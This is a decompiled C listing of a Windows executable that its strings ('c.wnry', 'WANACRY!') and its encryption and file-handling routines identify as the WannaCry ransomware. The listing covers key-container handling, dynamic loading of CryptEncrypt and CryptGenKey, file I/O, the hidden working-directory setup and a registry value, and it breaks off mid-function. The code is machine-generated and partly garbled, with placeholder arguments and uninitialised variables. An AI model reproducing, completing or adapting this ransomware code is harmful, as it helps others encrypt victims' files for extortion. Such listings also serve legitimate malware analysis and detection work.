int32_t __CxxFrameHandler(int32_t * a1, int32_t * a2, int32_t * a3, int32_t * a4);
int32_t __getmainargs(int32_t * a1, char *** a2, char *** a3, int32_t a4, int32_t * a5);
int32_t * __p__commode(void);
int32_t * __p__fmode(void);
void __set_app_type(int32_t a1);
void __setusermatherr(int32_t a1);
int32_t _controlfp(int32_t a1, int32_t a2);
void _CxxThrowException(int32_t * a1, int32_t * a2);
int32_t _except_handler3(struct _EXCEPTION_RECORD * a1, int32_t a2, struct _CONTEXT * a3, int32_t a4);
void _initterm(void (**a1)(), void (**a2)());
void _local_unwind2(int32_t a1, int32_t a2);
char * _mbsstr(char * a1, char * a2);
int32_t _XcptFilter(int32_t a1, int32_t * a2);
bool CryptReleaseContext(int32_t a1, int32_t a2);
bool GetFileSizeEx(int32_t * a1, struct _LARGE_INTEGER * a2);

// ------------------------ Functions -------------------------

// Address range: 0x401000 - 0x401064
int32_t function_401000(int32_t * data, int32_t a2) {
    struct _IO_FILE * file = fopen("c.wnry", a2 == 0 ? "wb" : "rb"); // 0x40101b
    if (file == NULL) {
        // 0x401061
        return 0;
    }
    int32_t items_written; // 0x401000
    if (a2 == 0) {
        // 0x401047
        items_written = fwrite(data, 780, 1, file);
    } else {
        // 0x40103f
        items_written = fread(data, 780, 1, file);
    }
    // 0x40104d
    fclose(file);
    // 0x401061
    return items_written != 0;
}

// Address range: 0x401064 - 0x4010fd
int32_t function_401064(int32_t * lpCommandLine, int32_t dwMilliseconds, int32_t a3) {
    int32_t lpStartupInfo = 68; // bp-88, 0x401074
    int32_t v1; // bp-84, 0x401064
    __asm_rep_stosd_memset((char *)&v1, 0, 16);
    int32_t lpProcessInformation = 0; // bp-20, 0x401082
    int32_t v2 = 0; // bp-16, 0x401085
    bool v3; // 0x401064
    int32_t v4 = v3 ? -4 : 4; // 0x401085
    int32_t v5 = v4 + (int32_t)&v2; // 0x401085
    *(int32_t *)v5 = 0;
    *(int32_t *)(v5 + v4) = 0;
    char * v6 = NULL; // bp-136, 0x4010a7
    bool v7 = CreateProcessA(NULL, (char *)lpCommandLine, NULL, NULL, false, 0x8000000, NULL, NULL, (struct _STARTUPINFOA *)&lpStartupInfo, (struct _PROCESS_INFORMATION *)&lpProcessInformation); // 0x4010a8
    if (!v7) {
        // 0x4010f9
        return 0;
    }
    int32_t v8 = (int32_t)&v6; // 0x4010b5
    if (dwMilliseconds != 0) {
        int32_t v9 = lpProcessInformation; // bp-144, 0x4010ba
        int32_t v10 = WaitForSingleObject((int32_t *)lpProcessInformation, dwMilliseconds); // 0x4010bd
        int32_t * v11 = &v9; // 0x4010c5
        if (v10 != 0) {
            int32_t v12 = lpProcessInformation; // bp-152, 0x4010c9
            TerminateProcess((int32_t *)lpProcessInformation, -1);
            v11 = &v12;
        }
        int32_t v13 = (int32_t)v11;
        v8 = v13;
        if (a3 != 0) {
            // 0x4010d7
            *(int32_t *)(v13 - 4) = a3;
            int32_t v14 = v13 - 8; // 0x4010da
            *(int32_t *)v14 = lpProcessInformation;
            GetExitCodeProcess(&g54, &g54);
            v8 = v14;
        }
    }
    // 0x4010e3
    *(int32_t *)(v8 - 4) = lpProcessInformation;
    CloseHandle(&g54);
    *(int32_t *)(v8 - 8) = v2;
    CloseHandle(&g54);
    // 0x4010f9
    return 1;
}

// Address range: 0x4010fd - 0x401225
int32_t function_4010fd(int32_t a1) {
    // 0x4010fd
    int32_t wstr; // bp-216, 0x4010fd
    __asm_rep_movsd_memcpy((char *)&wstr, (char *)0x40e04c, 5);
    char v1 = 0; // bp-736, 0x40111c
    int32_t v2 = 0; // bp-8, 0x401129
    int32_t v3; // bp-196, 0x4010fd
    __asm_rep_stosd_memset((char *)&v3, 0, 45);
    int32_t v4; // bp-735, 0x4010fd
    __asm_rep_stosd_memset((char *)&v4, 0, 129);
    bool v5; // 0x4010fd
    int32_t v6 = (v5 ? -516 : 516) + (int32_t)&v4; // 0x40113a
    *(int16_t *)v6 = 0;
    *(char *)(v6 + (v5 ? -2 : 2)) = 0;
    wcscat((int16_t *)&wstr, (int16_t *)0x40e034);
    int32_t v7 = &v1;
    int32_t hKey; // bp-16, 0x4010fd
    int32_t v8 = &hKey;
    int32_t v9; // bp-744, 0x4010fd
    int32_t v10 = &v9;
    int32_t v11 = 0;
    *(int32_t *)(v10 - 4) = (int32_t)&v2;
    *(int32_t *)(v10 - 8) = (int32_t)&wstr;
    int32_t v12 = v10 - 12;
    *(int32_t *)v12 = v11 != 0 ? -0x7fffffff : -0x7ffffffe;
    RegCreateKeyW(&g54, (int16_t *)&g54, (int32_t **)&g54);
    int32_t v13 = v12; // 0x401183
    int32_t result; // 0x4010fd
    int32_t v14; // 0x4010fd
    int32_t v15; // 0x4010fd
    int32_t v16; // 0x4010fd
    int32_t v17; // 0x4011e1
    int32_t v18; // 0x4011e4
    int32_t * v19; // 0x4011a6
    int32_t v20; // 0x4011ba
    int32_t v21; // 0x4011bd
    int32_t v22; // 0x4011f9
    if (v2 != 0) {
        if (a1 == 0) {
            // 0x4011cc
            hKey = 519;
            *(int32_t *)(v10 - 16) = v8;
            *(int32_t *)(v10 - 20) = v7;
            *(int32_t *)(v10 - 24) = 0;
            *(int32_t *)(v10 - 28) = 0;
            *(int32_t *)(v10 - 32) = (int32_t)"wd";
            v17 = v10 - 36;
            *(int32_t *)v17 = v2;
            v18 = RegQueryValueExA((int32_t *)hKey, (char *)&g54, &g54, &g54, (char *)&g54, &g54);
            v15 = v17;
            v14 = 0;
            if (v18 == 0) {
                // 0x4011f3
                v22 = v10 - 40;
                *(int32_t *)v22 = v7;
                SetCurrentDirectoryA((char *)&g54);
                v15 = v22;
                v14 = 1;
            }
        } else {
            // 0x40118e
            *(int32_t *)(v10 - 16) = v7;
            *(int32_t *)(v10 - 20) = 519;
            GetCurrentDirectoryA((int32_t)&g54, (char *)&g54);
            v19 = (int32_t *)(v10 - 24);
            *v19 = v7;
            *v19 = strlen((char *)&g54) + 1;
            *(int32_t *)(v10 - 28) = v7;
            *(int32_t *)(v10 - 32) = 1;
            *(int32_t *)(v10 - 36) = 0;
            *(int32_t *)(v10 - 40) = (int32_t)"wd";
            v20 = v10 - 44;
            *(int32_t *)v20 = v2;
            v21 = RegSetValueExA(&g54, (char *)&g54, (int32_t)&g54, (int32_t)&g54, (char *)&g54, (int32_t)&g54);
            v15 = v20;
            v14 = v21 == 0;
        }
        // 0x401200
        v16 = v15;
        v13 = v16 - 4;
        *(int32_t *)v13 = v2;
        RegCloseKey(&g54);
        if (v14 != 0) {
            // 0x401220
            *(int32_t *)(v16 - 8) = 1;
            result = 1;
            return result;
        }
    }
    // 0x40120d
    result = 0;
    while (v11 != 1) {
        // 0x40115c
        v10 = v13;
        v11 = 1;
        *(int32_t *)(v10 - 4) = (int32_t)&v2;
        *(int32_t *)(v10 - 8) = (int32_t)&wstr;
        v12 = v10 - 12;
        *(int32_t *)v12 = v11 != 0 ? -0x7fffffff : -0x7ffffffe;
        RegCreateKeyW(&g54, (int16_t *)&g54, (int32_t **)&g54);
        v13 = v12;
        if (v2 != 0) {
            if (a1 == 0) {
                // 0x4011cc
                hKey = 519;
                *(int32_t *)(v10 - 16) = v8;
                *(int32_t *)(v10 - 20) = v7;
                *(int32_t *)(v10 - 24) = 0;
                *(int32_t *)(v10 - 28) = 0;
                *(int32_t *)(v10 - 32) = (int32_t)"wd";
                v17 = v10 - 36;
                *(int32_t *)v17 = v2;
                v18 = RegQueryValueExA((int32_t *)hKey, (char *)&g54, &g54, &g54, (char *)&g54, &g54);
                v15 = v17;
                v14 = 0;
                if (v18 == 0) {
                    // 0x4011f3
                    v22 = v10 - 40;
                    *(int32_t *)v22 = v7;
                    SetCurrentDirectoryA((char *)&g54);
                    v15 = v22;
                    v14 = 1;
                }
            } else {
                // 0x40118e
                *(int32_t *)(v10 - 16) = v7;
                *(int32_t *)(v10 - 20) = 519;
                GetCurrentDirectoryA((int32_t)&g54, (char *)&g54);
                v19 = (int32_t *)(v10 - 24);
                *v19 = v7;
                *v19 = strlen((char *)&g54) + 1;
                *(int32_t *)(v10 - 28) = v7;
                *(int32_t *)(v10 - 32) = 1;
                *(int32_t *)(v10 - 36) = 0;
                *(int32_t *)(v10 - 40) = (int32_t)"wd";
                v20 = v10 - 44;
                *(int32_t *)v20 = v2;
                v21 = RegSetValueExA(&g54, (char *)&g54, (int32_t)&g54, (int32_t)&g54, (char *)&g54, (int32_t)&g54);
                v15 = v20;
                v14 = v21 == 0;
            }
            // 0x401200
            v16 = v15;
            v13 = v16 - 4;
            *(int32_t *)v13 = v2;
            RegCloseKey(&g54);
            if (v14 != 0) {
                // 0x401220
                *(int32_t *)(v16 - 8) = 1;
                result = 1;
                return result;
            }
        }
        // 0x40120d
        result = 0;
    }
  lab_0x40121c:
    // 0x40121c
    return result;
}

// Address range: 0x401225 - 0x4012fd
int32_t function_401225(int32_t * a1) {
    int32_t lpBuffer = g27; // bp-412, 0x401239
    int32_t nSize = 399; // bp-12, 0x401249
    int32_t v1; // bp-410, 0x401225
    __asm_rep_stosd_memset((char *)&v1, 0, 99);
    bool v2; // 0x401225
    *(int16_t *)((v2 ? -396 : 396) + (int32_t)&v1) = 0;
    int16_t * v3 = (int16_t *)&lpBuffer; // bp-432, 0x40125e
    GetComputerNameW((int16_t *)&lpBuffer, &nSize);
    int32_t v4 = wcslen((int16_t *)&lpBuffer); // 0x401279
    int32_t v5 = (int32_t)&v3; // 0x40127d
    int32_t * v6; // 0x401225
    int32_t v7; // 0x401225
    if (v4 == 0) {
        // 0x401225
        v6 = (int32_t *)(v5 - 4);
        v7 = 1;
    } else {
        int32_t v8 = &lpBuffer; // 0x401280
        int32_t * v9 = (int32_t *)(v5 - 4);
        int32_t wstr = 0; // 0x401280
        int32_t v10 = 1; // 0x401280
        int32_t v11 = v8; // 0x401280
        v10 *= (int32_t)*(int16_t *)v11;
        wstr++;
        *v9 = v8;
        uint32_t v12 = wcslen((int16_t *)wstr); // 0x401298
        v11 += 2;
        v6 = v9;
        v7 = v10;
        while (wstr < v12) {
            // 0x401286
            v10 *= (int32_t)*(int16_t *)v11;
            wstr++;
            *v9 = v8;
            v12 = wcslen((int16_t *)wstr);
            v11 += 2;
            v6 = v9;
            v7 = v10;
        }
    }
    int32_t result = (int32_t)a1;
    *v6 = v7;
    srand((int32_t)&g54);
    uint32_t v13 = rand(); // 0x4012ae
    *v6 = 8;
    int64_t v14 = v13; // 0x4012b6
    int32_t v15 = 0; // 0x4012be
    int32_t v16 = 0; // 0x4012be
    if (v16 >= 1) {
        int32_t v17 = rand(); // 0x4012c0
        *v6 = 26;
        *(char *)(v15 + result) = (char)((0x100000000 * (int64_t)(v17 >> 31) | (int64_t)v17) % 26) + 97;
        v15++;
        while (v15 != v16) {
            // 0x4012c0
            v17 = rand();
            *v6 = 26;
            *(char *)(v15 + result) = (char)((0x100000000 * (int64_t)(v17 >> 31) | (int64_t)v17) % 26) + 97;
            v15++;
        }
    }
    int32_t v18 = (int32_t)((0x100000000 * v14 | v14) % 8) + 11; // 0x4012d6
    int32_t v19 = v16; // 0x4012db
    if (v16 >= v18) {
        // 0x4012f1
        *(char *)(v16 + result) = 0;
        return result;
    }
    int32_t v20 = rand(); // 0x4012dd
    *v6 = 10;
    *(char *)(v19 + result) = (char)((0x100000000 * (int64_t)(v20 >> 31) | (int64_t)v20) % 10) + 48;
    v19++;
    while (v19 != v18) {
        // 0x4012dd
        v20 = rand();
        *v6 = 10;
        *(char *)(v19 + result) = (char)((0x100000000 * (int64_t)(v20 >> 31) | (int64_t)v20) % 10) + 48;
        v19++;
    }
    // 0x4012f1
    *(char *)(v18 + result) = 0;
    return result;
}

// Address range: 0x4012fd - 0x40135e
int32_t function_4012fd(void) {
    // 0x4012fd
    function_4076c8((int32_t)&g54);
    function_4017dd();
    int32_t result; // 0x4012fd
    int32_t v1 = result - 4; // 0x40131c
    *(int32_t *)v1 = 0;
    function_4017dd();
    *(char *)v1 = 1;
    function_402a46();
    *(int32_t *)(result + 1224) = 0;
    *(int32_t *)(result + 1228) = 0;
    *(int32_t *)(result + 1232) = 0;
    *(int32_t *)(result + 1236) = 0;
    *(int32_t *)result = (int32_t)&g1;
    __writefsdword(0, *(int32_t *)(result - 12));
    return result;
}

// Address range: 0x40137a - 0x4013ce
// Demangled:     protected: virtual __thiscall std::_Mpunct<char>::~_Mpunct<char>(void)
int32_t _3f__3f_1_3f__24__Mpunct_40_D_40_std_40__40_MAE_40_XZ(void) {
    // 0x40137a
    function_4076c8((int32_t)&g54);
    int32_t v1; // 0x40137a
    *(int32_t *)v1 = (int32_t)&g1;
    int32_t v2 = v1 - 4; // 0x401391
    int32_t * v3 = (int32_t *)v2; // 0x401391
    *v3 = 2;
    function_4013ce(v1, v1);
    char * v4 = (char *)v2; // 0x4013a0
    *v4 = 1;
    ??1?$_Mpunct@D@std@@MAE@XZ2();
    *v4 = 0;
    ??1?$_Mpunct@D@std@@MAE@XZ();
    *v3 = -1;
    int32_t result = ??1?$_Mpunct@D@std@@MAE@XZ(); // 0x4013bc
    __writefsdword(0, *(int32_t *)(v1 - 12));
    return result;
}

// Address range: 0x4013ce - 0x401437
int32_t function_4013ce(int32_t a1, int32_t a2) {
    // 0x4013ce
    function_4018b9();
    function_4018b9();
    int32_t v1; // 0x4013ce
    int32_t * v2 = (int32_t *)(v1 + 1224); // 0x4013e3
    int32_t v3 = *v2; // 0x4013e3
    int32_t v4 = v3; // 0x4013f6
    int32_t v5 = 0x100000; // 0x4013f6
    int32_t v6; // bp-12, 0x4013ce
    int32_t * v7 = &v6; // 0x4013f6
    if (v3 != 0) {
        *(char *)v4 = 0;
        v5--;
        v4++;
        while (v5 != 0) {
            // 0x4013fa
            *(char *)v4 = 0;
            v5--;
            v4++;
        }
        int32_t hMem = *v2; // 0x401401
        int32_t v8 = hMem; // bp-16, 0x401401
        GlobalFree((int32_t *)hMem);
        *v2 = 0;
        v7 = &v8;
    }
    int32_t v9 = (int32_t)v7;
    int32_t * v10 = (int32_t *)(v1 + 1228); // 0x401410
    int32_t v11 = *v10; // 0x401410
    int32_t v12 = v11; // 0x401418
    int32_t v13 = 0x100000; // 0x401418
    if (v11 == 0) {
        // 0x401430
        *(int32_t *)(v9 - 4) = 1;
        return 1;
    }
    *(char *)v12 = 0;
    v13--;
    v12++;
    while (v13 != 0) {
        // 0x40141a
        *(char *)v12 = 0;
        v13--;
        v12++;
    }
    int32_t v14 = v9 - 4; // 0x401421
    *(int32_t *)v14 = *v10;
    GlobalFree(&g54);
    *v10 = 0;
    // 0x401430
    *(int32_t *)(v14 - 4) = 1;
    return 1;
}

// Address range: 0x401437 - 0x4014a6
int32_t function_401437(int32_t a1, int32_t a2) {
    int32_t v1 = a2; // bp-16, 0x40143c
    if (function_401861(a2) == 0) {
        // 0x4014a0
        return 0;
    }
    int32_t * v2 = &v1; // 0x401452
    if (a1 != 0) {
        int32_t v3 = 0; // bp-20, 0x401454
        function_401861(0);
        v2 = &v3;
    }
    int32_t v4 = (int32_t)v2;
    *(int32_t *)(v4 - 4) = 0x100000;
    *(int32_t *)(v4 - 8) = 0;
    int32_t * v5 = GlobalAlloc((int32_t)&g54, (int32_t)&g54); // 0x40146a
    int32_t v6; // 0x401437
    *(int32_t *)(v6 + 1224) = (int32_t)v5;
    if (v5 == NULL) {
        // 0x4014a0
        return 0;
    }
    // 0x401476
    *(int32_t *)(v4 - 12) = 0x100000;
    *(int32_t *)(v4 - 16) = 0;
    int32_t * v7 = GlobalAlloc((int32_t)&g54, (int32_t)&g54); // 0x401479
    *(int32_t *)(v6 + 1228) = (int32_t)v7;
    int32_t result = 0; // 0x401483
    if (v7 != NULL) {
        int32_t * v8 = (int32_t *)(v4 - 20); // 0x40148d
        *v8 = 1;
        *(int32_t *)(v6 + 1236) = *(int32_t *)(v4 + 4);
        *(int32_t *)(v6 + 1232) = *(int32_t *)(v4 + 8);
        result = *v8;
    }
    // 0x4014a0
    return result;
}

// Address range: 0x4014a6 - 0x4016e1
int32_t function_4014a6(int32_t lpFileName, int32_t a2) {
    int32_t v1 = __readfsdword(0); // bp-20, 0x4014bb
    int32_t v2 = &v1; // 0x4014bb
    __writefsdword(0, v2);
    char str = 0; // bp-576, 0x4014e0
    int32_t v3 = 0; // bp-575, 0x4014ee
    bool v4; // 0x4014a6
    int32_t v5 = (v4 ? -4 : 4) + (int32_t)&v3; // 0x4014ee
    *(int16_t *)v5 = 0;
    *(char *)(v5 + (v4 ? -2 : 2)) = 0;
    int32_t v6 = lpFileName; // bp-632, 0x40150a
    int32_t * fileHandle = CreateFileA((char *)lpFileName, -0x80000000, 1, NULL, 3, 0, NULL); // 0x40150d
    int32_t v7 = &v6; // 0x40151e
    if (fileHandle != (int32_t *)-1) {
        int32_t v8 = (int32_t)fileHandle; // 0x40150d
        int32_t v9 = v8; // bp-640, 0x401528
        int32_t v10 = &v9; // 0x401528
        int32_t lpFileSize; // bp-40, 0x4014a6
        GetFileSizeEx(fileHandle, (struct _LARGE_INTEGER *)&lpFileSize);
        v7 = v10;
        int32_t v11; // 0x4014a6
        if (v11 <= 0) {
            // 0x401538
            v7 = v10;
            if (v11 != 0 || lpFileSize < 0x6400001) {
                int32_t v12 = v8; // bp-660, 0x401555
                int32_t memcmp_rc = memcmp((int32_t *)&str, (int32_t *)"WANACRY!", 8); // 0x401572
                v7 = &v12;
                if (memcmp_rc == 0) {
                    int32_t v13 = v8; // bp-680, 0x401590
                    v7 = &v13;
                }
            }
        }
    }
    // 0x4016d0
    *(int32_t *)(v7 - 4) = -1;
    *(int32_t *)(v7 - 8) = v2;
    _local_unwind2((int32_t)&g54, (int32_t)&g54);
    int32_t result = function_4016f9((int32_t)&g54, (int32_t)&g54, (int32_t)&g54); // 0x4016df
    return result;
}

// Address range: 0x4016e1 - 0x4016f7
int32_t function_4016e1(void) {
    // 0x4016e1
    int32_t result; // 0x4016e1
    return result;
}

// Address range: 0x4016f9 - 0x40170a
int32_t function_4016f9(int32_t a1, int32_t a2, int32_t a3) {
    // 0x4016f9
    int32_t result; // 0x4016f9
    __writefsdword(0, *(int32_t *)(result - 16));
    return result;
}

// Address range: 0x40170a - 0x4017dd
int32_t function_40170a(void) {
    // 0x40170a
    int32_t v1; // 0x40170a
    if (function_401a45(v1, v1) == 0) {
        // 0x4017da
        return 0;
    }
    // 0x401719
    int32_t v2; // bp-8, 0x40170a
    int32_t v3 = &v2; // 0x401721
    if (g28 == 0) {
        int32_t * moduleHandle = LoadLibraryA("kernel32.dll"); // 0x40172c
        if (moduleHandle == NULL) {
            // 0x4017da
            return 0;
        }
        // 0x40173c
        g28 = (int32_t)GetProcAddress(moduleHandle, "CreateFileW");
        g29 = (int32_t)GetProcAddress(moduleHandle, "WriteFile");
        g30 = (int32_t)GetProcAddress(moduleHandle, "ReadFile");
        g31 = (int32_t)GetProcAddress(moduleHandle, "MoveFileW");
        g32 = (int32_t)GetProcAddress(moduleHandle, "MoveFileExW");
        char * v4 = "CloseHandle"; // bp-68, 0x40178c
        g33 = (int32_t)GetProcAddress(moduleHandle, "DeleteFileW");
        int32_t (*func)() = GetProcAddress(moduleHandle, "CloseHandle"); // 0x401797
        g34 = (int32_t)func;
        v3 = (int32_t)&v4;
        if (func == NULL || g28 == 0 | g29 == 0 | g30 == 0 | g31 == 0 || g32 == 0 || g33 == 0) {
            // 0x4017da
            return 0;
        }
    }
    // 0x4017d3
    *(int32_t *)(v3 - 4) = 1;
    // 0x4017da
    return 1;
}

// Address range: 0x4017dd - 0x4017ff
int32_t function_4017dd(void) {
    // 0x4017dd
    int32_t result; // 0x4017dd
    *(int32_t *)(result + 4) = 0;
    *(int32_t *)(result + 8) = 0;
    *(int32_t *)(result + 12) = 0;
    *(int32_t *)result = (int32_t)&g2;
    InitializeCriticalSection((struct _RTL_CRITICAL_SECTION *)(result + 16));
    return result;
}

// Address range: 0x40181b - 0x40182c
// Demangled:     protected: virtual __thiscall std::_Mpunct<char>::~_Mpunct<char>(void)
int32_t ??1?$_Mpunct@D@std@@MAE@XZ(void) {
    // 0x40181b
    int32_t v1; // 0x40181b
    *(int32_t *)v1 = (int32_t)&g2;
    DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)(v1 + 16));
    return &g54;
}

// Address range: 0x40182c - 0x401861
int32_t function_40182c(int32_t a1) {
    int32_t v1 = 0;
    int32_t v2; // bp-8, 0x40182c
    int32_t v3 = &v2;
    *(int32_t *)(v3 - 4) = -0x10000000;
    *(int32_t *)(v3 - 8) = 24;
    int32_t v4 = v1 == 0 ? 0 : (int32_t)"Microsoft Enhanced RSA and AES Cryptographic Provider"; // 0x401840
    *(int32_t *)(v3 - 12) = v4;
    *(int32_t *)(v3 - 16) = 0;
    int32_t v5 = v3 - 20; // 0x401848
    int32_t v6; // 0x40182c
    *(int32_t *)v5 = v6 + 4;
    while (v1 == 0) {
        // 0x401853
        if (v1 == 1) {
            // 0x401859
            return 0;
        }
        v1 = 1;
        v3 = v5;
        *(int32_t *)(v3 - 4) = -0x10000000;
        *(int32_t *)(v3 - 8) = 24;
        v4 = v1 == 0 ? 0 : (int32_t)"Microsoft Enhanced RSA and AES Cryptographic Provider";
        *(int32_t *)(v3 - 12) = v4;
        *(int32_t *)(v3 - 16) = 0;
        v5 = v3 - 20;
        *(int32_t *)v5 = v6 + 4;
    }
    // 0x40185c
    *(int32_t *)(v3 - 24) = 1;
    // 0x401859
    return 1;
}

// Address range: 0x401861 - 0x4018b9
int32_t function_401861(int32_t a1) {
    // 0x401861
    int32_t v1; // 0x401861
    int32_t v2 = v1;
    if (a1 != 0 != function_40182c(v1) != 0) {
        // 0x4018a7
        function_4018b9();
        // 0x4018b5
        return 0;
    }
    // 0x4018a3
    if (function_4018f9(*(int32_t *)(v2 + 4), v2 + 8, a1) != 0) {
        // 0x4018b2
        int32_t v3; // bp-4, 0x401861
        *(int32_t *)((int32_t)&v3 - 4) = 1;
        // 0x4018b5
        return 1;
    }
    // 0x4018a7
    function_4018b9();
    // 0x4018b5
    return 0;
}

// Address range: 0x4018b9 - 0x4018f9
int32_t function_4018b9(void) {
    // 0x4018b9
    int32_t v1; // 0x4018b9
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x4018bc
    int32_t v3 = *v2; // 0x4018bc
    int32_t hProv; // bp-4, 0x4018b9
    int32_t * v4 = &hProv; // 0x4018c1
    if (v3 != 0) {
        int32_t v5 = v3; // bp-8, 0x4018c3
        *v2 = 0;
        v4 = &v5;
    }
    int32_t v6 = (int32_t)v4;
    int32_t * v7 = (int32_t *)(v1 + 12); // 0x4018ce
    int32_t v8 = *v7; // 0x4018ce
    int32_t v9 = v6; // 0x4018d3
    if (v8 != 0) {
        // 0x4018d5
        v9 = v6 - 4;
        *(int32_t *)v9 = v8;
        *v7 = 0;
    }
    int32_t * v10 = (int32_t *)(v1 + 4); // 0x4018e0
    int32_t v11 = *v10; // 0x4018e0
    int32_t v12 = v9; // 0x4018e5
    if (v11 != 0) {
        // 0x4018e7
        *(int32_t *)(v9 - 4) = 0;
        v12 = v9 - 8;
        *(int32_t *)v12 = v11;
        CryptReleaseContext(hProv, (int32_t)&g54);
        *v10 = 0;
    }
    // 0x4018f4
    *(int32_t *)(v12 - 4) = 1;
    return 1;
}

// Address range: 0x4018f9 - 0x4019b1
int32_t function_4018f9(int32_t a1, int32_t a2, int32_t lpFileName) {
    int32_t v1 = __readfsdword(0); // bp-20, 0x40190e
    int32_t v2 = &v1; // 0x40190e
    __writefsdword(0, v2);
    int32_t lpNumberOfBytesRead = 0; // bp-32, 0x401922
    int32_t v3 = lpFileName; // bp-84, 0x401937
    int32_t * fileHandle = CreateFileA((char *)lpFileName, -0x80000000, 1, NULL, 3, 0, NULL); // 0x40193a
    int32_t * v4 = &v3; // 0x401946
    if (fileHandle != (int32_t *)-1) {
        int32_t v5 = (int32_t)fileHandle; // 0x40193a
        int32_t v6 = v5; // bp-92, 0x401949
        uint32_t dwBytes = GetFileSize(fileHandle, NULL); // 0x40194a
        v4 = &v6;
        if (dwBytes < 0x19001) {
            int32_t v7 = 0; // bp-100, 0x401963
            int32_t * lpBuffer = GlobalAlloc(0, dwBytes); // 0x401964
            v4 = &v7;
            if (lpBuffer != NULL) {
                int32_t v8 = v5; // bp-120, 0x40197a
                bool v9 = ReadFile(fileHandle, lpBuffer, dwBytes, &lpNumberOfBytesRead, NULL); // 0x40197d
                v4 = &v8;
                if (v9) {
                    int32_t v10 = a1; // bp-144, 0x401990
                    v4 = &v10;
                }
            }
        }
    }
    int32_t v11 = (int32_t)v4;
    *(int32_t *)(v11 - 4) = -1;
    *(int32_t *)(v11 - 8) = v2;
    _local_unwind2((int32_t)&g54, (int32_t)&g54);
    int32_t result = function_4019d2((int32_t)&g54, (int32_t)&g54, (int32_t)&g54); // 0x4019af
    return result;
}

// Address range: 0x4019b1 - 0x4019d0
int32_t function_4019b1(void) {
    // 0x4019b1
    int32_t v1; // 0x4019b1
    int32_t hMem = *(int32_t *)(v1 - 32); // 0x4019b1
    int32_t v2; // 0x4019b1
    if (hMem != 0) {
        // 0x4019b7
        v2 = (int32_t)GlobalFree((int32_t *)hMem);
    }
    int32_t hObject = *(int32_t *)(v1 - 40); // 0x4019c0
    int32_t handleClosed = v2; // 0x4019c4
    if (hObject != -1) {
        // 0x4019c6
        handleClosed = CloseHandle((int32_t *)hObject);
    }
    // 0x4019cf
    return handleClosed;
}

// Address range: 0x4019d2 - 0x4019e1
int32_t function_4019d2(int32_t a1, int32_t a2, int32_t a3) {
    // 0x4019d2
    int32_t result; // 0x4019d2
    __writefsdword(0, *(int32_t *)(result - 16));
    return result;
}

// Address range: 0x4019e1 - 0x401a45
int32_t function_4019e1(int32_t a1, int32_t a2, int32_t * a3, int32_t * a4) {
    int32_t result = 0; // 0x4019ec
    int32_t v1; // 0x4019e1
    if (*(int32_t *)(v1 + 8) != 0) {
        struct _RTL_CRITICAL_SECTION * lpCriticalSection = (struct _RTL_CRITICAL_SECTION *)(v1 + 16); // 0x4019f1
        EnterCriticalSection(lpCriticalSection);
        LeaveCriticalSection(lpCriticalSection);
        memcpy(a3, (int32_t *)a1, a2);
        *a4 = a2;
        result = 1;
    }
    // 0x401a3f
    return result;
}

// Address range: 0x401a45 - 0x401af6
// Used cryptographic patterns:
//  - Windows_CryptAcquireContext (8-bit)
//  - Windows_CryptDecrypt (8-bit)
//  - Windows_CryptImportKey (8-bit)
int32_t function_401a45(int32_t a1, int32_t a2) {
    // 0x401a45
    if (g35 != 0) {
        // 0x401aec
        int32_t v1; // bp-8, 0x401a45
        *(int32_t *)((int32_t)&v1 - 4) = 1;
        // 0x401af3
        return 1;
    }
    int32_t * moduleHandle = LoadLibraryA("advapi32.dll"); // 0x401a5a
    if (moduleHandle == NULL) {
        // 0x401af3
        return 0;
    }
    // 0x401a6a
    g35 = (int32_t)GetProcAddress(moduleHandle, "CryptAcquireContextA");
    g36 = (int32_t)GetProcAddress(moduleHandle, "CryptImportKey");
    g37 = (int32_t)GetProcAddress(moduleHandle, "CryptDestroyKey");
    g38 = (int32_t)GetProcAddress(moduleHandle, "CryptEncrypt");
    char * v2 = "CryptGenKey"; // bp-60, 0x401aad
    g39 = (int32_t)GetProcAddress(moduleHandle, "CryptDecrypt");
    int32_t (*func)() = GetProcAddress(moduleHandle, "CryptGenKey"); // 0x401ab8
    g40 = (int32_t)func;
    if (func == NULL || g35 == 0 | g36 == 0 | g37 == 0 || g38 == 0 || g39 == 0) {
        // 0x401af3
        return 0;
    }
    // 0x401aec
    *(int32_t *)((int32_t)&v2 - 4) = 1;
    // 0x401af3
    return 1;
}

// Address range: 0x401af6 - 0x401b5f
int32_t function_401af6(int16_t * lpPathName, int16_t * lpPathName2, int32_t wstr) {
    // 0x401af6
    CreateDirectoryW(lpPathName, NULL);
    if (!SetCurrentDirectoryW(lpPathName)) {
        // 0x401b5a
        return 0;
    }
    // 0x401b18
    CreateDirectoryW(lpPathName2, NULL);
    if (!SetCurrentDirectoryW(lpPathName2)) {
        // 0x401b5a
        return 0;
    }
    // 0x401b2b
    SetFileAttributesW(lpPathName2, GetFileAttributesW(lpPathName2) | 6);
    if (wstr != 0) {
        // 0x401b42
        swprintf((int16_t *)wstr, (int32_t)&g22, lpPathName);
    }
    // 0x401b5a
    return 1;
}

// Address range: 0x401b5f - 0x401ce8
int32_t function_401b5f(int32_t a1) {
    int32_t lpBuffer = g27; // bp-1244, 0x401b80
    int32_t v1; // bp-1242, 0x401b5f
    __asm_rep_stosd_memset((char *)&v1, 0, 129);
    bool v2; // 0x401b5f
    int32_t v3 = v2 ? -516 : 516; // 0x401b87
    *(int16_t *)(v3 + (int32_t)&v1) = 0;
    int16_t wstr = g27; // bp-724, 0x401b95
    int32_t v4; // bp-722, 0x401b5f
    __asm_rep_stosd_memset((char *)&v4, 0, 129);
    *(int16_t *)(v3 + (int32_t)&v4) = 0;
    int16_t lpWideCharStr = g27; // bp-204, 0x401bab
    int32_t v5; // bp-202, 0x401b5f
    __asm_rep_stosd_memset((char *)&v5, 0, 49);
    *(int16_t *)((v2 ? -196 : 196) + (int32_t)&v5) = 0;
    MultiByteToWideChar(0, 0, (char *)&g41, -1, &lpWideCharStr, (int32_t)&g54);
    GetWindowsDirectoryW((int16_t *)&lpBuffer, 260);
    swprintf(&wstr, 0x40f40c, (int16_t *)&lpBuffer);
    int16_t * v6 = &wstr; // bp-1288, 0x401c0f
    int32_t v7; // 0x401b5f
    if (GetFileAttributesW(&wstr) == -1) {
        // 0x401b5f
        v7 = (int32_t)&v6;
    } else {
        int32_t v8 = function_401af6(&wstr, &lpWideCharStr, a1); // 0x401c2c
        int32_t v9 = (int32_t)&v6;
        v7 = v9;
        if (v8 != 0) {
